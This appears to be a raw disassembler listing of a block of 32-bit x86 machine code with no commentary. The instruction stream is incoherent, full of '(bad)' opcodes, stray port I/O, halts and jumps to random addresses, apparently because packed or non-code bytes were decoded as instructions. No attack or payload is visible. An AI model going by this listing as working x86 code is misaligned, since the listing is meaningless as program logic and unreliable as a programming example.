  437d9b:	inc    DWORD PTR [ebp+ebp*8-0x4b]
  437d9f:	les    edx,FWORD PTR [ebx+0x5516e02]
  437da5:	mov    esp,DWORD PTR [ebx+ecx*1]
  437da8:	adc    eax,0xaab03b8b
  437dad:	cwde   
  437dae:	call   0xdd698ab6
  437db3:	nop
  437db4:	dec    ecx
  437db5:	lods   al,BYTE PTR ds:[esi]
  437db6:	sbb    BYTE PTR [ecx-0x3ce7282f],dl
  437dbc:	sbb    DWORD PTR [eax-0x2d],ebx
  437dbf:	inc    ebx
  437dc0:	or     eax,0x8810ac7d
  437dc5:	shl    BYTE PTR [eax],0x16
  437dc8:	sub    bh,BYTE PTR [ebp-0x57]
  437dcb:	cld    
  437dcc:	sbb    ebx,DWORD PTR [edx-0x1b]
  437dcf:	aas    
  437dd0:	inc    esi
  437dd1:	jge    0x437d83
  437dd3:	ret    
  437dd4:	mov    bh,0x54
  437dd6:	mov    al,0xc6
  437dd8:	push   cs
  437dd9:	add    BYTE PTR [esi-0x39],bl
  437ddc:	sub    esi,DWORD PTR [edx+0x5163f715]
  437de2:	and    BYTE PTR [edx+0x9],ah
  437de5:	cmp    al,BYTE PTR [edi+esi*8]
	...
  437e04:	add    BYTE PTR [eax],al
  437e06:	daa    
  437e07:	test   edx,ebp
  437e09:	sub    eax,0xaa48af9
  437e0e:	add    eax,0xe9384250
  437e13:	adc    edi,DWORD PTR [edx]
  437e15:	sbb    DWORD PTR [ebp+0x12],esp
  437e18:	add    BYTE PTR [ecx-0x223bc6f2],ch
  437e1e:	test   DWORD PTR [eax+0x73],edi
  437e21:	clc    
  437e22:	dec    ebx
  437e23:	cmp    ebx,eax
  437e25:	loope  0x437e12
  437e27:	push   esi
  437e28:	add    al,0x95
  437e2a:	in     eax,dx
  437e2b:	cmp    eax,ecx
  437e2d:	push   cs
  437e2e:	outs   dx,BYTE PTR ds:[esi]
  437e2f:	push   ecx
  437e30:	mov    esi,0xbe810eed
  437e35:	adc    al,BYTE PTR [esi+0x5eb0cde9]
  437e3b:	add    al,0x74
  437e3d:	(bad)  
  437e3e:	in     al,0xf6
  437e40:	dec    edi
  437e41:	or     esp,esi
  437e43:	std    
  437e44:	popa   
  437e45:	and    BYTE PTR [ecx-0xc],al
  437e48:	jae    0x437e3c
  437e4a:	cwde   
  437e4b:	(bad)  
  437e4c:	push   ecx
  437e4d:	imul   ebx,DWORD PTR [ecx+0xc],0x6dfff76f
  437e54:	lock mov edi,0xef53f051
  437e5a:	push   ss
  437e5b:	xor    al,0xf0
  437e5d:	imul   edi,DWORD PTR [ecx+0x4e7c0b0c],0x4edbbf56
  437e67:	jns    0x437eba
  437e69:	add    BYTE PTR ds:[eax],al
	...
  437e88:	xchg   edx,eax
  437e89:	stos   BYTE PTR es:[edi],al
  437e8a:	gs cmc 
  437e8c:	imul   eax,eax,0x26
  437e8f:	jns    0x437e80
  437e91:	adc    DWORD PTR [ebx],0x880840e8
  437e97:	fst    QWORD PTR [eax+eax*2]
  437e9a:	dec    ebx
  437e9b:	hlt    
  437e9c:	adc    BYTE PTR [ebp+0x5a],0x2a
  437ea0:	aad    0x80
  437ea2:	jmp    0x437f16
  437ea4:	aad    0xb
  437ea6:	jg     0x437eed
  437ea8:	mov    edx,DWORD PTR ss:[ecx+esi*1+0x66]
  437ead:	sar    edx,cl
  437eaf:	add    bl,cl
  437eb1:	mov    ebp,0x86f84581
  437eb6:	dec    ebx
  437eb7:	or     BYTE PTR [ecx+0x58],ch
  437eba:	in     al,dx
  437ebb:	call   0x3940f3
  437ec0:	sahf   
  437ec1:	jge    0x8d96970c
  437ec7:	inc    ebp
  437ec8:	sbb    al,0x53
  437eca:	not    DWORD PTR ds:0x40199c
  437ed0:	addr16 mov edi,0xaf6c906
  437ed6:	add    BYTE PTR [ebp+0x2f],dl
  437ed9:	addr16 jg 0x437ec8
  437edc:	test   al,0x3
  437ede:	add    BYTE PTR [eax],al
  437ee0:	repnz pop eax
  437ee2:	lea    esi,[ebp-0xa3e50]
  437ee8:	int3   
  437ee9:	aad    0x7d
  437eeb:	inc    BYTE PTR [eax]
	...
  437f09:	add    bl,cl
  437f0b:	lods   eax,DWORD PTR ds:[esi]
  437f0c:	mov    edx,0xf3ef1940
  437f11:	call   0x437c06
  437f16:	jmp    0xac418199
  437f1b:	ror    DWORD PTR [edx-0x1],0x71
  437f1f:	arpl   WORD PTR [eax+eax*2],cx
  437f22:	je     0x437f20
  437f24:	mov    edi,0x27ee950
  437f29:	dec    BYTE PTR [ebx-0x5d74b53f]
  437f2f:	fld    DWORD PTR fs:[ebx]
  437f32:	xor    al,0x3
  437f34:	mov    bh,0xdc
  437f36:	mov    ds:0x6484003d,al
  437f3b:	clc    
  437f3c:	cmp    ebp,DWORD PTR [edx+0x34]
  437f3f:	xchg   BYTE PTR [ebx-0xa3f357c],al
  437f45:	push   eax
  437f46:	or     eax,0x47e7c622
  437f4b:	stos   BYTE PTR es:[edi],al
  437f4c:	(bad)  
  437f4d:	dec    DWORD PTR [ecx-0x69d7c817]
  437f53:	fisubr WORD PTR [ebx-0x156f6a0]
  437f59:	or     ebp,0x6c
  437f5c:	sbb    DWORD PTR [edi-0x172ef35],eax
  437f62:	jmp    0xfea9:0xce975a8
  437f69:	mov    WORD PTR [eax+0xfac09c],ss
	...
  437f8b:	add    dl,dl
  437f8d:	out    0x3,al
  437f8f:	add    BYTE PTR [ebp+0x70],cl
  437f92:	xor    ecx,edi
  437f94:	jge    0x437f3d
  437f96:	stos   DWORD PTR es:[edi],eax
  437f97:	xor    eax,0x2ccd27
  437f9c:	pop    edx
  437f9d:	sahf   
  437f9e:	adc    DWORD PTR [eax+0x3],edx
  437fa1:	jmp    0x1c40e5a9
  437fa6:	add    BYTE PTR [ebx+0x4fbfc59b],0x3a
  437fad:	mov    esi,0xe9234c11
  437fb2:	add    edi,DWORD PTR [edi+0x49]
  437fb5:	ror    BYTE PTR [ecx+0x4fc08144],1
  437fbb:	push   DWORD PTR [edx-0x58]
  437fbe:	jne    0x437fa9
  437fc0:	or     al,0xa9
  437fc2:	dec    BYTE PTR [eax+ecx*4+0x5afac0a4]
  437fc9:	pop    esi
  437fca:	(bad)  
  437fcb:	dec    ebp
  437fcd:	out    dx,eax
  437fce:	xor    bh,cl
  437fd0:	jmp    FWORD PTR [eax+0x5f]
  437fd3:	pop    edx
  437fd4:	push   esp
  437fd5:	imul   edi,DWORD PTR [esi+0x3c],0x43833d
  437fdc:	or     eax,0xbcf6dc00
  437fe1:	jne    0x437fd3
  437fe3:	loope  0x437fc8
  437fe5:	(bad)  
  437fe6:	mov    edx,0xf71801c0
  437feb:	inc    ebx
  437fec:	or     eax,0xb40380
	...
  43800d:	add    cl,ch
  43800f:	inc    ecx
  438010:	jmp    0x4150f818
  438015:	sbb    eax,0x8729b5f6
  43801a:	mov    dl,0x2c
  43801c:	repz test BYTE PTR [ecx],dh
  43801f:	lods   al,BYTE PTR ds:[esi]
  438020:	cmp    eax,DWORD PTR [ebp+ecx*1+0x0]
  438024:	sub    eax,DWORD PTR [esi]
  438026:	fst    st(3)
  438028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438029:	add    ecx,DWORD PTR [esi+ecx*2]
  43802c:	add    dl,BYTE PTR [esi]
  43802e:	sub    DWORD PTR [edx],edx
  438030:	test   eax,0x14786703
  438035:	fsincos 
  438037:	jmp    DWORD PTR ds:0x9ba8192d
  43803d:	mov    edi,0xbf38b5a7
  438042:	push   ds
  438043:	fsubr  st(4),st
  438045:	mov    esi,0x43f35801
  43804a:	or     eax,0x7e10ac81
  43804f:	fcomp  st(5)
  438051:	ret    
  438052:	inc    edx
  438053:	ret    0x3ec
  438056:	retf   0xcb88
  438059:	dec    edi
  43805a:	pop    ds
  43805b:	inc    eax
  43805c:	jmp    0x38f2b53
  438061:	(bad)  
  438062:	int3   
  438063:	loope  0x43806f
  438065:	(bad)  
  438066:	int3   
  438067:	in     eax,dx
  438068:	(bad)  
  438069:	pop    ss
  43806a:	cmp    BYTE PTR ds:0x3e9853e8,0xf1
  438071:	repnz add BYTE PTR [eax],al
	...
  438090:	xor    DWORD PTR [eax+0x0],edx
  438093:	pusha  
  438094:	sub    ecx,DWORD PTR [eax-0x398c1a97]
  43809a:	jle    0x4380c9
  43809c:	std    
  43809d:	sbb    eax,0x2a21c704
  4380a2:	sbb    ebp,ebx
  4380a4:	or     al,BYTE PTR [ebx-0x7d410bbe]
  4380aa:	inc    ecx
  4380ab:	in     eax,0x5e
  4380ad:	mov    ecx,0x831652ce
  4380b2:	inc    ecx
  4380b3:	aad    0x55
  4380b5:	push   eax
  4380b6:	sti    
  4380b7:	aam    0x5e
  4380b9:	adc    al,BYTE PTR [eax-0x17]
  4380bc:	xor    BYTE PTR [ebp+0x42],bh
  4380bf:	add    BYTE PTR [esi-0x7670f440],cl
  4380c5:	and    BYTE PTR ds:[edi],dl
  4380c8:	or     dh,BYTE PTR [esi-0x90f1d92]
  4380ce:	push   0xffffffd2
  4380d0:	cli    
  4380d1:	or     ah,BYTE PTR [esi-0x27]
  4380d4:	popf   
  4380d5:	inc    ecx
  4380d6:	pop    ss
  4380d7:	cdq    
  4380d8:	popf   
  4380d9:	ds and al,0x39
  4380dc:	push   0xffffffc5
  4380de:	popa   
  4380df:	jb     0x43812c
  4380e1:	fnstsw WORD PTR [esi-0x53]
  4380e4:	or     bl,BYTE PTR [ebp-0x7d06bcf3]
  4380ea:	inc    ecx
  4380eb:	or     eax,0xd4fb4fe4
  4380f0:	ficom  WORD PTR [ecx]
  4380f2:	inc    eax
  4380f3:	jmp    0x4380f8
	...
  438110:	add    BYTE PTR [eax],al
  438112:	pop    eax
  438114:	or     edi,edx
  438116:	dec    esi
  438117:	push   ebx
  438118:	bound  esi,QWORD PTR [eax-0x30]
  43811b:	jmp    0x438173
  43811d:	stos   BYTE PTR es:[edi],al
  43811e:	mov    edi,0xcac4874a
  438123:	adc    DWORD PTR [eax-0x17],eax
  438126:	and    al,0xc
  438128:	lea    eax,[eax]
  43812a:	sti    
  43812b:	add    edx,DWORD PTR [eax-0x73]
  43812e:	jmp    0xf700:0x2ac64ffa
  438135:	aad    0xaf
  438137:	fisttp WORD PTR [edi+0x16]
  43813a:	je     0x43813c
  43813c:	jnp    0x438102
  43813e:	xor    dl,bl
  438140:	jp     0x4381c1
  438142:	add    al,0xfc
  438144:	popa   
  438145:	add    al,0x38
  438147:	add    al,0x8d
  438149:	inc    edi
  43814a:	lock dec edi
  43814c:	lea    eax,[esi-0x27]
  43814f:	dec    edi
  438150:	not    ebp
  438152:	dec    edi
  438153:	pop    es
  438154:	lea    eax,[esi-0x27]
  438157:	jmp    0xce76d15b
  43815c:	pusha  
  43815d:	mov    ebp,DWORD PTR [ebx-0xf3b8661]
  438163:	fisttp QWORD PTR [eax+0x7adddd46]
  438169:	jg     0x4380f3
  43816b:	jmp    DWORD PTR [ecx+0x10]
  43816e:	cmp    BYTE PTR ds:0x4fc8478d,cl
  438174:	lea    eax,[esi+0x0]
	...
  438193:	add    bh,bl
  438195:	dec    edi
  438196:	not    ebp
  438198:	pop    edx
  438199:	mov    DWORD PTR ds:0x6c83734,edi
  43819f:	xor    BYTE PTR [edx+0x310de301],0x3a
  4381a6:	adc    ebp,DWORD PTR [edx+0x74]
  4381a9:	dec    edi
  4381aa:	not    ebx
  4381ac:	test   edi,0x53a43306
  4381b2:	pop    esi
  4381b3:	mov    DWORD PTR [edx],ebp
  4381b5:	test   eax,0x4a27c351
  4381ba:	bound  edi,QWORD PTR [eax]
  4381bc:	(bad)  
  4381bd:	sti    
  4381be:	dec    esi
  4381bf:	mov    ecx,DWORD PTR ds:0xbd14bc99
  4381c5:	stos   BYTE PTR es:[edi],al
  4381c6:	add    BYTE PTR ds:[esi+0x208713e3],dl
  4381cd:	in     eax,0x11
  4381cf:	inc    eax
  4381d0:	or     eax,0x4d16dc32
  4381d5:	push   esp
  4381d6:	dec    edx
  4381d7:	adc    ch,dh
  4381d9:	out    0x80,eax
  4381db:	mov    edi,0x5012cf05
  4381e0:	mov    BYTE PTR [edx+0x6],ah
  4381e3:	push   eax
  4381e4:	adc    dh,dh
  4381e6:	mov    al,BYTE PTR [ecx+0x55]
  4381e9:	stos   BYTE PTR es:[edi],al
  4381ea:	jae    0x43821b
  4381ec:	mov    ds,esp
  4381ee:	sbb    esi,ebx
  4381f0:	fcmovne st,st(5)
  4381f2:	mov    ah,0x1e
  4381f4:	std    
  4381f5:	shl    DWORD PTR [ebx+0x1],1
	...
  438214:	add    BYTE PTR [eax],al
  438216:	push   ebp
  438217:	jno    0x43824b
  438219:	sub    DWORD PTR [esi+0x53751310],ecx
  43821f:	jg     0x43822f
  438221:	lea    ecx,[ebx-0x5f]
  438224:	dec    esi
  438225:	lea    edx,[edx-0x3b]
  438228:	dec    esi
  438229:	sti    
  43822a:	fidivr WORD PTR [edx-0x79]
  43822d:	inc    ecx
  43822e:	setp   BYTE PTR [ecx+ecx*2+0xe]
  438233:	jnp    0x4381f2
  438235:	fist   WORD PTR ds:0x2b0bc326
  43823b:	scas   al,BYTE PTR es:[edi]
  43823c:	mov    ebp,0xf7e18461
  438241:	out    0xef,al
  438243:	or     BYTE PTR ds:[ebp-0x72b15b2d],cl
  43824a:	retf   0x4ed4
  43824d:	sti    
  43824e:	pop    esi
  43824f:	inc    edx
  438250:	mov    DWORD PTR [ecx+0xf],eax
  438253:	shl    BYTE PTR [ecx+ecx*2+0xe],cl
  438257:	add    BYTE PTR [ebx],cl
  438259:	ret    
  43825a:	inc    edx
  43825b:	pop    es
  43825c:	mov    WORD PTR [esi],0xde1a
  438261:	ret    0x88ec
  438264:	and    esp,esp
  438266:	in     al,0x56
  438268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438269:	sub    DWORD PTR ds:0xcc4e926,ecx
  43826f:	and    BYTE PTR [ebx+eax*2+0xd],0xb3
  438274:	ror    DWORD PTR [edi-0x7516c004],cl
	...
  438296:	add    BYTE PTR [eax],al
  438298:	int3   
  438299:	sti    
  43829a:	ins    DWORD PTR es:[edi],dx
  43829b:	lds    ebx,FWORD PTR [ebx+0x49]
  43829e:	pop    esi
  43829f:	mov    dl,0x2a
  4382a1:	push   cs
  4382a2:	jmp    0xaced8faa
  4382a7:	out    0xa,eax
  4382a9:	push   DWORD PTR [ebp+eax*1-0x291a57a1]
  4382b0:	div    DWORD PTR [ecx-0x41bb3aa3]
  4382b6:	in     al,dx
  4382b7:	add    edi,DWORD PTR [edi]
  4382b9:	test   DWORD PTR [edi],edx
  4382bb:	mov    BYTE PTR [esp+edi*8+0x29],cl
  4382bf:	add    eax,0x3a8848d
  4382c4:	nop
  4382c5:	sar    BYTE PTR [esi+eax*1+0x42],0xb8
  4382ca:	out    0x36,eax
  4382cc:	adc    esi,DWORD PTR [ecx+0x401c97db]
  4382d2:	jmp    0xe23fd757
  4382d7:	pop    edx
  4382d8:	bound  eax,QWORD PTR [ebp-0x3f6fffd8]
  4382de:	pop    esp
  4382df:	or     edx,DWORD PTR [edx]
  4382e1:	mov    eax,0xf3132fe7
  4382e6:	jmp    0x2a07:0x34800c04
  4382ed:	sar    bh,0xa9
  4382f0:	jp     0x438363
  4382f2:	aas    
  4382f3:	stos   BYTE PTR es:[edi],al
  4382f4:	mov    esp,0x8a38eb78
  4382f9:	sbb    al,0xfc
  4382fb:	jmp    0x438300
	...
  438318:	add    BYTE PTR [eax],al
  43831a:	test   DWORD PTR [esp+edi*8],edi
  43831d:	cmp    DWORD PTR [esi+0x10010c2c],edx
  438323:	cmp    al,0x0
  438325:	jmp    0xf53e831a
  43832a:	push   es
  43832b:	mov    ch,0x14
  43832d:	push   ecx
  43832e:	pop    ds
  43832f:	inc    eax
  438330:	add    BYTE PTR [ecx+edx*2+0x29],ah
  438334:	add    esi,DWORD PTR [edx-0x34]
  438337:	mov    bl,0x84
  438339:	sub    esp,ebx
  43833b:	mov    cl,0x2d
  43833d:	sub    DWORD PTR [eax+0x73],eax
  438340:	pop    es
  438341:	jmp    0xf1a94b49
  438346:	xchg   ebx,eax
  438347:	mov    edi,0x2c109155
  43834c:	or     DWORD PTR [eax],ebx
  43834e:	mov    eax,ds:0x696a1feb
  438353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438354:	out    0xeb,al
  438356:	mov    ecx,0xa4944598
  43835b:	xchg   DWORD PTR [ebx],eax
  43835d:	fs cdq 
  43835f:	into   
  438360:	ds jmp 0xea3c02b7
  438366:	or     DWORD PTR [eax],eax
  438368:	add    BYTE PTR [ebx-0x27],bh
  43836b:	pusha  
  43836c:	add    BYTE PTR [edx],ch
  43836e:	mov    dh,dh
  438370:	push   DWORD PTR [ebx+0xb]
  438373:	sub    BYTE PTR [eax-0x17],al
  438376:	push   cs
  438377:	mov    al,0x65
  438379:	call   0xe9a98366
	...
  43839a:	add    BYTE PTR [eax],al
  43839c:	cmp    al,0xb5
  43839e:	adc    al,0x3d
  4383a0:	and    DWORD PTR [eax+0x0],eax
  4383a3:	add    cl,dh
  4383a5:	mov    esp,0xfe050573
  4383aa:	sub    eax,eax
  4383ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4383ad:	sub    al,0x0
  4383af:	ret    
  4383b0:	in     eax,dx
  4383b1:	or     BYTE PTR ds:[eax+0x1c],cl
  4383b5:	lock or BYTE PTR [ebx+0x667afc52],al
  4383bc:	pusha  
  4383bd:	cld    
  4383be:	loop   0x438401
  4383c0:	mov    bh,0x6
  4383c2:	test   DWORD PTR [eax+0x43dc2c49],0x3574fc24
  4383cc:	adc    esi,DWORD PTR ds:0xfbf7de03
  4383d2:	dec    esi
  4383d3:	jmp    DWORD PTR [ecx]
  4383d5:	adc    al,0xa
  4383d7:	inc    eax
  4383d8:	and    al,0x7c
  4383da:	cmp    esi,DWORD PTR [eax+0x39d9]
  4383e0:	loope  0x4383f4
  4383e2:	call   0xf5adcf61
  4383e7:	test   BYTE PTR [edi+ebx*8],ah
  4383ea:	add    eax,0xdc300183
  4383ef:	inc    ebx
  4383f0:	hlt    
  4383f1:	add    edi,DWORD PTR [esi+0x39c84405]
  4383f7:	add    ch,ah
  4383f9:	push   edx
  4383fa:	not    DWORD PTR ds:0x4015d8
	...
  43841c:	add    BYTE PTR [eax],al
  43841e:	jnp    0x43849e
  438420:	rol    bl,0xa2
  438423:	jle    0x43840f
  438425:	mov    esi,DWORD PTR [edx-0x5]
  438428:	inc    edi
  438429:	dec    eax
  43842a:	xor    BYTE PTR [eax],cl
  43842c:	add    DWORD PTR [esi-0x50],0xffffff80
  438430:	mov    edx,0xf753b374
  438435:	adc    eax,0x401394
  43843a:	or     eax,0x8384ee22
  43843f:	push   ebp
  438440:	pop    es
  438441:	or     ax,0xb90f
  438445:	adc    al,0xfd
  438447:	enter  0x3e,0xd3
  43844b:	pop    ecx
  43844c:	dec    edx
  43844d:	xchg   DWORD PTR [ecx+0x8],edi
  438450:	push   ebp
  438451:	push   edx
  438452:	xchg   esi,eax
  438453:	mov    DWORD PTR [ecx+eax*2+0x534bf105],ecx
  43845a:	fpatan 
  43845c:	stos   DWORD PTR es:[edi],eax
  43845d:	inc    esi
  43845e:	dec    edx
  43845f:	jle    0x438419
  438461:	or     DWORD PTR [ebp-0x54],0xfffffffa
  438465:	sub    eax,0x8d35924d
  43846a:	mov    bl,0x9c
  43846c:	repz (bad) 
  43846e:	in     al,0xbd
  438470:	sub    DWORD PTR [eax],esi
  438472:	xchg   esi,eax
  438473:	pop    edi
  438474:	push   es
  438475:	daa    
  438476:	dec    esi
  438477:	aad    0x2
  438479:	dec    eax
  43847a:	cwde   
  43847b:	test   al,0xbf
  43847d:	inc    esp
  43847e:	or     DWORD PTR [ebp+0xff7e],esp
	...
  4384a0:	add    dl,BYTE PTR [edx+0x1]
  4384a3:	ret    
  4384a4:	push   eax
  4384a5:	in     eax,dx
  4384a6:	add    al,0x80
  4384a8:	or     eax,0x3e4f4f99
  4384ad:	fisubr WORD PTR [edx]
  4384af:	cld    
  4384b0:	loop   0x438480
  4384b2:	mov    bh,0x14
  4384b4:	popa   
  4384b5:	test   eax,0xd888003e
  4384ba:	sub    al,BYTE PTR [esp+edx*4]
  4384bd:	popf   
  4384be:	stos   DWORD PTR es:[edi],eax
  4384bf:	mov    esi,0xc2b065e
  4384c4:	mov    edx,0xfafb0733
  4384c9:	mov    ch,0x9
  4384cb:	js     0x4384ca
  4384cd:	pop    eax
  4384ce:	inc    BYTE PTR [edi-0x66]
  4384d1:	inc    eax
  4384d3:	sbb    al,0xcd
  4384d5:	aas    
  4384d6:	into   
  4384d7:	jmp    0xdd598a67
  4384dc:	cmp    edi,DWORD PTR [ecx+0x3611570f]
  4384e2:	loop   0x438470
  4384e4:	loope  0x4384dd
  4384e6:	jmp    0xf654a35c
  4384eb:	ror    DWORD PTR [ebp+0xd03a9a1],cl
  4384f1:	add    BYTE PTR [eax-0x1b0ced55],ch
  4384f7:	mov    fs,WORD PTR [edx-0x2b]
  4384fa:	and    eax,0x1beacc04
  4384ff:	or     BYTE PTR [ebx+0x16fa0],dh
	...
  438521:	add    BYTE PTR [ebp+0x0],bh
  438524:	sbb    bl,BYTE PTR [edx-0x26]
  438527:	mov    eax,0x550d0ba6
  43852c:	pop    esi
  43852d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43852e:	mov    ebp,0x880bb87a
  438533:	cmp    DWORD PTR [edx+0x4a],ebx
  438536:	mov    edi,0xf084ad33
  43853b:	add    ch,dl
  43853d:	pop    es
  43853e:	dec    ebx
  43853f:	xor    ebx,ecx
  438541:	rcl    BYTE PTR [ecx-0x54],0xd4
  438545:	add    ecx,DWORD PTR ds:0xce003e00
  43854b:	inc    ebx
  43854c:	sub    eax,0xe9000d13
  438551:	mov    WORD PTR [edx],ds
  438553:	add    al,0x6e
  438555:	rol    DWORD PTR cs:[ebx+0x1a272f28],1
  43855c:	jmp    0x97efd6e7
  438561:	push   eax
  438562:	xor    eax,DWORD PTR [edx]
  438564:	cdq    
  438565:	mov    eax,0xd9001819
  43856a:	dec    esi
  43856b:	add    BYTE PTR [edi-0xf],bh
  43856e:	or     al,0x33
  438570:	add    eax,0x73abdc20
  438575:	stc    
  438576:	lahf   
  438577:	ins    DWORD PTR es:[edi],dx
  438578:	out    0xe5,al
  43857a:	jl     0x4385e9
  43857c:	out    0xe1,al
  43857e:	xchg   edi,eax
  43857f:	lods   eax,DWORD PTR ds:[esi]
  438580:	icebp  
  438581:	cdq    
  438582:	mov    BYTE PTR [edx],al
  438584:	mov    al,0xe8
	...
  4385a2:	add    BYTE PTR [eax],al
  4385a4:	fdiv   DWORD PTR [esi-0x6669e342]
  4385aa:	jle    0x438569
  4385ac:	adc    eax,0x1c74523d
  4385b1:	mov    ah,0xe7
  4385b3:	adc    eax,0x96faaa9b
  4385b8:	cld    
  4385b9:	sti    
  4385ba:	xchg   BYTE PTR [edi-0x6ef7cb86],ah
  4385c0:	ins    DWORD PTR es:[edi],dx
  4385c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4385c2:	cli    
  4385c3:	jle    0x438552
  4385c5:	ins    DWORD PTR es:[edi],dx
  4385c6:	jae    0x4385ae
  4385c8:	xchg   edi,eax
  4385c9:	mov    edi,0xaa5bf2e7
  4385ce:	cli    
  4385cf:	ins    DWORD PTR es:[edi],dx
  4385d0:	push   ecx
  4385d1:	xor    DWORD PTR [edx+ebx*4],eax
  4385d4:	or     BYTE PTR [ebp+0x7be61afd],ah
  4385da:	inc    esp
  4385db:	push   ebp
  4385dc:	mov    cl,0x86
  4385de:	stc    
  4385df:	inc    esi
  4385e0:	ret    0x8646
  4385e3:	sub    dl,BYTE PTR [esi-0x49]
  4385e6:	mov    ebp,0x87530ee1
  4385eb:	cmp    eax,0xeb9f9888
  4385f0:	push   cs
  4385f1:	add    BYTE PTR [edi+0x72],cl
  4385f4:	mov    al,0xf9
  4385f6:	mov    dl,0xaa
  4385f8:	retf   0x534e
  4385fb:	xchg   DWORD PTR [ebp-0x54ff8b94],ecx
  438601:	sub    BYTE PTR [eax+eax*1+0x36e300a4],dl
	...
  438624:	add    BYTE PTR [eax],al
  438626:	aaa    
  438627:	jmp    0xb15c8533
  43862c:	mov    edi,DWORD PTR [ebp-0xa98bc]
  438632:	mov    esp,0x63ff57e2
  438637:	jne    0x4386a2
  438639:	or     bh,ch
  43863b:	ins    DWORD PTR es:[edi],dx
  43863c:	dec    edx
  43863d:	(bad)  
  43863e:	jmp    0xb4437f5b
  438643:	(bad)  
  438644:	dec    DWORD PTR [edi-0x23]
  438647:	push   ebx
  438648:	add    DWORD PTR [eax],eax
  43864a:	je     0x4386a4
  43864c:	jb     0x4385e9
  43864e:	mov    bl,0x75
  438650:	jns    0x438616
  438652:	push   esp
  438653:	jg     0x43860f
  438655:	je     0x43869b
  438657:	sub    BYTE PTR [esi-0x72ffcc00],al
  43865d:	mov    ebp,0xfff572dc
  438662:	pushf  
  438663:	mov    dl,0x52
  438665:	jmp    DWORD PTR [ebx-0x4ca5e5a8]
  43866b:	jne    0x4386b7
  43866d:	call   0x3a84bd
  438672:	lahf   
  438673:	out    dx,eax
  438674:	or     ecx,DWORD PTR [ecx+0xfba80fa]
  43867a:	push   0xe4fffa92
  43867f:	jl     0x4386c4
  438681:	or     al,0xf7
  438683:	mov    edi,0xabb73960
  438688:	mov    edi,DWORD PTR [ebp+0x0]
	...
  4386a7:	add    al,al
  4386a9:	add    dl,BYTE PTR [ebp-0x3bfa240]
  4386af:	call   0x3ef4cd
  4386b4:	or     eax,0x3c73bf1d
  4386b9:	jg     0x4386b5
  4386bb:	addr16 xchg ecx,eax
  4386bd:	xor    eax,0xf025003f
  4386c2:	(bad)  
  4386c3:	dec    DWORD PTR ds:0x52e7ebb2
  4386c9:	fwait
  4386ca:	mov    bl,0xfa
  4386cc:	xchg   ecx,eax
  4386cd:	pop    ecx
  4386ce:	das    
  4386cf:	push   esi
  4386d0:	daa    
  4386d1:	test   eax,0x41196eb3
  4386d6:	int3   
  4386d7:	inc    DWORD PTR [edx+0x6531b399]
  4386dd:	push   DWORD PTR [ecx-0x3bda8d07]
  4386e3:	jae    0x4386b5
  4386e5:	add    BYTE PTR ds:[ebp+0x68535cc8],cl
  4386ec:	inc    edi
  4386ed:	cdq    
  4386ee:	(bad)  
  4386ef:	call   DWORD PTR [edx-0x2d]
  4386f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4386f3:	and    ecx,DWORD PTR [ebx-0x6d]
  4386f6:	mov    ah,0x83
  4386f8:	dec    ebp
  4386f9:	adc    eax,0x51908ce5
  4386fe:	mov    dl,0xfa
  438700:	xor    cl,BYTE PTR [ecx]
  438702:	mov    ch,0x14
  438704:	push   ecx
  438705:	(bad)  
  438706:	add    BYTE PTR ds:[ebp+0xa77b4b],bh
	...
  438729:	add    BYTE PTR [ebx],bl
  43872b:	and    dh,BYTE PTR [ebp+0x3eda54f]
  438731:	add    BYTE PTR ds:0x2e7ea52,cl
  438737:	cmp    al,0xb2
  438739:	cli    
  43873a:	xchg   ecx,eax
  43873b:	fsubr  DWORD PTR [edi]
  43873d:	push   es
  43873e:	xchg   BYTE PTR [ebx+0xe],ah
  438741:	ret    0x980d
  438744:	outs   dx,BYTE PTR ds:[esi]
  438745:	add    dh,dh
  438747:	rol    DWORD PTR [edi+0x1aff9031],cl
  43874d:	xor    BYTE PTR [eax],al
  43874f:	stos   DWORD PTR es:[edi],eax
  438750:	shr    BYTE PTR [ebx-0x4aee2ebf],cl
  438756:	pop    esp
  438757:	cwde   
  438758:	jns    0x43872c
  43875a:	mov    bh,0xaa
  43875c:	mov    dh,0xc3
  43875e:	push   edi
  43875f:	dec    edx
  438760:	sahf   
  438761:	retf   0xfb68
  438764:	call   0x91f411b6
  438769:	mov    BYTE PTR [esp+eax*1],dl
  43876c:	stos   BYTE PTR es:[edi],al
  43876d:	std    
  43876e:	mov    bh,BYTE PTR [ebx+0x28]
  438771:	add    al,0x90
  438773:	stos   BYTE PTR es:[edi],al
  438774:	pop    esp
  438775:	pop    es
  438776:	xchg   dl,dh
  438778:	rol    BYTE PTR [ebp+0x5c],0xaa
  43877c:	ror    DWORD PTR [ebp+eiz*2+0x37],0x98
  438781:	mov    ah,0x67
  438783:	mov    cl,0x2c
  438785:	loopne 0x43879d
  438787:	add    DWORD PTR [edx+0x293416fd],esp
  43878d:	add    al,0x0
	...
  4387ab:	add    cl,bl
  4387ad:	add    DWORD PTR [ebx],esi
  4387af:	lods   al,BYTE PTR ds:[esi]
  4387b0:	add    ecx,edx
  4387b2:	xchg   ecx,eax
  4387b3:	mov    ah,0xe7
  4387b5:	jbe    0x438759
  4387b7:	push   ebp
  4387b8:	jnp    0x4387bd
  4387ba:	jmp    0x61a21d3a
  4387bf:	sub    BYTE PTR [ebx+0x54],0x5e
  4387c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4387c4:	mov    ds:0x268070a3,eax
  4387c9:	and    esi,DWORD PTR [esi+0x5f76be4d]
  4387cf:	lock retf 0xdc7b
  4387d3:	fild   WORD PTR [edx+0x77]
  4387d6:	int3   
  4387d7:	fild   WORD PTR [esi]
  4387d9:	cwde   
  4387da:	inc    esi
  4387db:	sub    al,0xf7
  4387dd:	test   eax,0x7b112c6d
  4387e2:	jmp    FWORD PTR [edx+eax*8-0x455a76fb]
  4387e9:	in     eax,0x2e
  4387eb:	sub    ebp,ebx
  4387ed:	rol    dl,cl
  4387ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4387f0:	jmp    0xc300:0x4e659405
  4387f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
